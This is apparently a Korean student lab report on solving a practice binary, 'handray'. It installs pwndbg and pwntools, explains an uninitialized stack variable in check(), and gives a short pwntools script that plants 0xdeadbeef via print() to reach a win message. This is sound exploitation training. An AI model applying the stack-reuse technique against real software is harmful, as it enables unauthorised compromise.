# 2차 과제 보고서

## 1. pwndbg 플러그인 설치

본 과제에서는 `handray` 바이너리를 동적으로 확인하기 위해 `pwndbg`를 설치하였다. `pwndbg`는 `gdb`에서 레지스터, 스택, 디스어셈블 결과 등을 보기 쉽게 출력해주는 디버깅 플러그인이다.

설치는 다음 명령어로 진행하였다.

```bash
sudo apt update
sudo apt install -y git gdb python3 python3-pip python3-venv python3-dev

git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

설치 후 다음 명령어로 `handray`를 실행하여 `pwndbg`가 정상적으로 로드되는지 확인하였다.

```bash
gdb ./handray
```

`gdb` 실행 후 프롬프트가 `pwndbg>` 형태로 표시되면 설치가 정상적으로 완료된 것이다.

## 2. pwntools 설치

`pwntools`는 Python에서 바이너리를 실행하고, 입력을 전송하고, 출력을 받아오는 과정을 자동화할 수 있는 라이브러리이다. 이번 과제에서는 `handray`에 원하는 입력을 순서대로 전달하기 위해 사용하였다.

Ubuntu 24.04 환경에서는 Python 가상환경을 만든 뒤 그 안에 설치하였다.

```bash
sudo apt install -y python3-venv python3-pip python3-dev build-essential libssl-dev libffi-dev

python3 -m venv ~/pwnenv
source ~/pwnenv/bin/activate

pip install --upgrade pip
pip install --upgrade pwntools
```

설치 확인은 다음 명령어로 진행하였다.

```bash
python3 -c "from pwn import *; print('pwntools ok')"
```

## 3. handray 분석 결과 정리

1차 과제에서 `handray` 바이너리를 분석한 결과, 프로그램은 `main`, `print`, `check` 함수를 중심으로 동작한다.

`main` 함수는 반복적으로 프롬프트를 출력하고 사용자 입력을 받는다.

```c
while (1) {
    write(1, "> ", 2);
    read(0, &input, 2);

    switch ((unsigned char)input) {
    case '1':
        print();
        break;
    case '2':
        puts("Hello World!");
        break;
    case '3':
        check();
        break;
    default:
        break;
    }
}
```

입력값이 `'1'`이면 `print()`가 호출되고, `'2'`이면 `"Hello World!"`가 출력되며, `'3'`이면 `check()`가 호출된다.

`print` 함수는 사용자 입력을 스택의 `[rbp-0x20]` 위치에 있는 버퍼에 저장한다.

```c
void print(void) {
    char buf[24] = {0};
    int n;

    n = read(0, buf, 23);

    if (n == 0) {
        puts("no.");
    } else {
        printf("-> %s\n", buf);
    }
}
```

`check` 함수는 `[rbp-0x20]` 위치의 8바이트 값을 읽어 `0xdeadbeef`와 비교한다.

```c
void check(void) {
    unsigned long value;

    if (value == 0xdeadbeef) {
        puts("[*] YOU WIN !");
        exit(1);
    }

    puts("NOPE");
}
```

여기서 `value`는 초기화되지 않은 상태로 사용된다. 어셈블리에서도 `[rbp-0x20]` 위치에 값을 저장하는 코드 없이 바로 값을 읽어 비교한다.

```asm
mov    rax,QWORD PTR [rbp-0x20]
mov    edx,0xdeadbeef
cmp    rax,rdx
jne    ...
```

따라서 `check` 함수는 초기화되지 않은 스택 값을 `0xdeadbeef`와 비교하는 구조이다.

## 4. 해결 방향

`print` 함수와 `check` 함수는 모두 `[rbp-0x20]` 부근의 스택 공간을 사용한다.

`print` 함수에서는 이 위치에 사용자 입력이 저장된다.

```text
print(): [rbp-0x20]에 사용자 입력 저장
```

이후 `check` 함수를 호출하면, `check` 함수는 같은 위치의 값을 초기화하지 않은 상태로 읽는다.

```text
check(): [rbp-0x20] 값을 읽어 0xdeadbeef와 비교
```

함수가 종료되어도 스택 메모리가 자동으로 0으로 지워지는 것은 아니기 때문에, `print`에서 입력한 값이 스택에 남아 있을 수 있다. 따라서 먼저 `print`를 호출하여 `0xdeadbeef` 값을 스택에 남기고, 그 다음 `check`를 호출하면 `"[*] YOU WIN !"` 메시지를 출력할 수 있다.

필요한 실행 순서는 다음과 같다.

```text
1 입력
→ print() 호출

0xdeadbeef payload 입력
→ print()의 스택 버퍼에 값 저장

3 입력
→ check() 호출
→ check()가 스택에 남은 값을 읽음
→ 0xdeadbeef와 같으면 YOU WIN 출력
```

## 5. payload 구성

x86-64 환경은 리틀 엔디언 방식으로 값을 저장한다. 따라서 `0xdeadbeef`는 메모리에 다음 순서로 저장되어야 한다.

```text
ef be ad de 00 00 00 00
```

`pwntools`에서는 `p64(0xdeadbeef)`를 사용하여 64비트 리틀 엔디언 바이트열을 만들 수 있다.

`print` 함수에서 `read(0, buf, 23)`을 호출하므로, 전체 payload 길이는 23바이트로 맞추었다.

```python
payload = p64(0xdeadbeef) + b"A" * (0x17 - 8)
```

`0x17`은 10진수로 23이고, `p64(0xdeadbeef)`는 8바이트이므로 나머지 15바이트는 임의의 값으로 채웠다.

## 6. pwntools exploit 코드

다음은 `"[*] YOU WIN !"` 메시지를 출력하기 위해 작성한 코드이다.

```python
from pwn import *

context.binary = './handray'
context.log_level = 'info'

p = process(context.binary.path)

p.recvuntil(b'> ')
p.send(b'1\n')

payload = p64(0xdeadbeef) + b'A' * (0x17 - 8)
p.send(payload)

p.recvuntil(b'> ')
p.send(b'3\n')

p.interactive()
```

코드의 실행 흐름은 다음과 같다.

| 코드 | 의미 |
|---|---|
| `process('./handray')` | `handray` 바이너리 실행 |
| `recvuntil(b'> ')` | 프롬프트가 출력될 때까지 대기 |
| `send(b'1\n')` | `print()` 호출 |
| `send(payload)` | `0xdeadbeef` 값을 스택에 입력 |
| `send(b'3\n')` | `check()` 호출 |
| `interactive()` | 이후 출력 확인 |

## 7. 실행 방법

`handray`와 `solve_handray.py`가 같은 디렉터리에 있는 상태에서 다음 명령어로 실행하였다.

```bash
cd ~/pwn-lab/SecurityFact/Study/Task_2nd
chmod +x ./handray
source ~/pwnenv/bin/activate
python3 solve_handray.py
```

성공 시 다음 메시지가 출력된다.

```text
[*] YOU WIN !
```

## 8. gdb / pwndbg 확인

`pwndbg`를 이용하면 `check` 함수 내부의 비교 구문을 직접 확인할 수 있다.

```bash
gdb ./handray
```

`gdb` 내부에서 다음 명령어를 사용한다.

```gdb
disassemble check
```

핵심 부분은 다음과 같다.

```asm
mov    rax,QWORD PTR [rbp-0x20]
mov    edx,0xdeadbeef
cmp    rax,rdx
jne    ...
```

`check` 함수는 `[rbp-0x20]`에 있는 값을 읽어 `0xdeadbeef`와 비교한다. 이 위치의 값이 `0xdeadbeef`이면 실패 분기로 점프하지 않고 성공 메시지를 출력한다.

## 9. 결론

이번 과제에서는 1차 과제에서 분석한 `handray` 바이너리의 구조를 바탕으로 `"[*] YOU WIN !"` 메시지가 출력되도록 하였다.

핵심 원리는 `check` 함수가 초기화되지 않은 지역변수를 사용한다는 점이다. `print` 함수에서 먼저 `0xdeadbeef` 값을 스택에 남기고, 이후 `check` 함수를 호출하면 같은 스택 위치의 값이 재사용될 수 있다. 이를 이용하여 `check` 함수의 비교 조건을 만족시키고 성공 메시지를 출력할 수 있었다.
